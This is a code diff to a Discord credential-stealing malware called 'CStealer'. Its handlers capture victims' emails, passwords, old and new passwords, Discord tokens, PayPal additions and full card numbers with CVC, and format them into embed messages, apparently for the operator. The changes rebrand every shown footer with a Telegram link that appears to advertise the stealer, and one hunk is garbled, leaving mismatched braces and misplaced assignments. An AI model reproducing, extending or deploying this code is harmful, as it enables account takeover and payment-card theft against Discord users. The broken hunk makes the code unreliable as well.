@@ -648,7 +648,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer',
+          text: 'CStealer | t.me/cstealerr',
         },
         thumbnail: {
           url: 'https://media.discordapp.net/attachments/988835185300742258/997093134787944539/ansn.png',
@@ -693,9 +693,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-        this.config.embed.footer = {
-            text: `${this.utils.encryption.decryptData(this.config.user.hostname)} | ${this.config.embed.credits}`,
-            icon_url: this.config.embed.avatar_url,
+        text: 'CStealer | t.me/cstealerr',
         }
         },
       },
@@ -738,7 +736,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer',
+          text: 'CStealer | t.me/cstealerr',
         },
       },
     ],
@@ -780,7 +778,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer',
+          text: 'CStealer | t.me/cstealerr',
         },
       },
     ],
@@ -822,7 +820,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer',
+          text: 'CStealer | t.me/cstealerr',
         },
       },
     ],
@@ -866,7 +864,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'CStealer',
+          text: 'CStealer | t.me/cstealerr',
         },
       },
     ],
